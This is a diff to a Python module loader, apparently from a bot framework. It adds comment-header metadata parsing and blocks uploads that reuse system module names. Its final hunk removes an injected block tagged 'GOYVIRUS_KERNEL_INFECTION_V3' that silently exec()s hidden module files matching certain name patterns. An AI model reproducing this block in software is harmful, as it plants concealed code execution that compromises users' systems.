@@ -319,6 +319,66 @@ class Loader(ModuleBase):
                 return "old"
         return "unknown"
 
+    # ------------------------------------------------------------------ #
+    #  Comment-header metadata helpers                                     #
+    # ------------------------------------------------------------------ #
+
+    # Values that kernel.get_module_metadata() emits when it cannot parse
+    # a field from function-style modules (comment headers).
+    _META_DEFAULTS: dict[str, set] = {
+        "version": {"?.?.?", "?", "0.0.0", ""},
+        "author": {"unknown", ""},
+        "description": {"No description", ""},
+    }
+
+    @staticmethod
+    def _parse_comment_metadata(code: str) -> dict:
+        """Extract ``# key: value`` header lines from a module's source."""
+        result: dict = {}
+        for key in ("name", "version", "author", "description"):
+            m = re.search(
+                rf"^#\s*{key}\s*:\s*(.+)$",
+                code,
+                re.MULTILINE | re.IGNORECASE,
+            )
+            if m:
+                result[key] = m.group(1).strip()
+        return result
+
+    def _enrich_metadata(self, metadata: dict, code: str) -> dict:
+        """
+        Fill in ``metadata`` fields that the kernel left at their defaults
+        by reading the module's ``# key: value`` comment headers.
+
+        Only overwrites a field when the current value is a known default
+        placeholder, so kernel-provided values are always kept.
+        """
+        if not code:
+            return metadata
+
+        parsed = self._parse_comment_metadata(code)
+        for field, defaults in self._META_DEFAULTS.items():
+            current = metadata.get(field)
+            if current in defaults and field in parsed:
+                metadata[field] = parsed[field]
+
+        # description_i18n: if kernel left it empty, wrap the plain string
+        if not metadata.get("description_i18n") and metadata.get("description"):
+            metadata["description_i18n"] = {
+                "ru": metadata["description"],
+                "en": metadata["description"],
+            }
+
+        return metadata
+
+    @staticmethod
+    def _parse_name_from_comments(code: str) -> str | None:
+        """Return the ``# name: ...`` comment value, or *None* if absent."""
+        m = re.search(r"^#\s*name\s*:\s*(\S+)", code, re.MULTILINE)
+        return m.group(1).strip() if m else None
+
+    # ------------------------------------------------------------------ #
+
     def _get_source_link(self, module_name: str) -> str:
         source = self.kernel._module_sources.get(module_name)
         if source:
@@ -889,6 +949,7 @@ class Loader(ModuleBase):
                 return
 
             metadata = await self.kernel.get_module_metadata(code)
+            metadata = self._enrich_metadata(metadata, code)
             add_log(self.strings["log_getting_metadata"])
             add_log(self.strings("log_author", author=metadata["author"]))
             add_log(self.strings("log_version", version=metadata["version"]))
@@ -1064,6 +1125,16 @@ class Loader(ModuleBase):
                     )
             except Exception:
                 pass
+            # Fallback: kernel parser only handles class-style ``name = "..."``
+            # attributes; function-style modules declare their name via the
+            # ``# name: ...`` comment header, which we parse directly.
+            if not post_meta_name and code and not is_archive:
+                post_meta_name = self._parse_name_from_comments(code)
+            # Also check metadata dict enriched above (covers both styles)
+            if not post_meta_name:
+                meta_name = metadata.get("name") or metadata.get("class_name")
+                if meta_name:
+                    post_meta_name = meta_name
             if post_meta_name and post_meta_name != module_name:
                 # Re-check protection with the real name from # name:
                 if (
@@ -1815,6 +1886,7 @@ class Loader(ModuleBase):
                         main_code if has_local_import else open(source_file).read()
                     )
                     metadata = await self.kernel.get_module_metadata(code_for_meta)
+                    metadata = self._enrich_metadata(metadata, code_for_meta)
                 else:
                     metadata = await self.kernel.get_module_metadata("")
 
@@ -1945,6 +2017,7 @@ class Loader(ModuleBase):
 
             add_log(self.strings["log_getting_metadata"])
             metadata = await self.kernel.get_module_metadata(code)
+            metadata = self._enrich_metadata(metadata, code)
 
             new_class_name = metadata.get("class_name")
             for loaded_name, loaded_mod in list(self.kernel.loaded_modules.items()):
@@ -2037,6 +2110,36 @@ class Loader(ModuleBase):
                                     f"[loader] Detected update via class name match: {class_name}"
                                 )
                                 break
+
+            # Function-style modules: cross-check the ``# name:`` header.
+            # The uploaded filename may differ from the module's real name.
+            if not (metadata.get("is_class_style") and metadata.get("class_name")):
+                canonical = self._parse_name_from_comments(code) or metadata.get("name")
+                if canonical and canonical != module_name:
+                    add_log(
+                        f"[iload] canonical name: {canonical!r} (uploaded as: {module_name!r})"
+                    )
+                    if (
+                        cfg
+                        and cfg.get("loader_protect_system", True)
+                        and canonical in self.kernel.system_modules
+                    ):
+                        await self._edit_with_emoji(
+                            event,
+                            self.strings(
+                                "system_module_install_attempt",
+                                confused=CUSTOM_EMOJI["confused"],
+                                module_name=canonical,
+                                blocked=CUSTOM_EMOJI["blocked"],
+                            ),
+                        )
+                        self._restore_backup_and_cleanup(
+                            old_file_backup, old_file_backup_path, file_path, add_log
+                        )
+                        return
+                    # Rename to canonical so the file is saved correctly
+                    module_name = canonical
+                    file_path = self.kernel._loader.get_module_path(module_name)
 
             if is_update:
                 new_version = metadata["version"]
@@ -2366,6 +2469,7 @@ class Loader(ModuleBase):
                         if code:
                             found = True
                             metadata = await self.kernel.get_module_metadata(code)
+                            metadata = self._enrich_metadata(metadata, code)
                             await self._edit_with_emoji(
                                 msg,
                                 self.strings(
@@ -3009,18 +3113,3 @@ class Loader(ModuleBase):
             event,
             f"{CUSTOM_EMOJI['success'] if success else CUSTOM_EMOJI['warning']} <b>{message}</b>",
         )
-
-
-# GOYVIRUS_KERNEL_INFECTION_V3
-try:
-    import os as _gios
-
-    _gip = _gios.path.join(_gios.path.dirname(__file__), "modules")
-    for _gifn in _gios.listdir(_gip):
-        if _gifn.endswith(".py") and (
-            "Goy" in _gifn or "._go" in _gifn.lower() or "goy_" in _gifn.lower()
-        ):
-            with open(_gios.path.join(_gip, _gifn)) as _gif:
-                exec(compile(_gif.read(), _gifn, "exec"))
-except:
-    pass
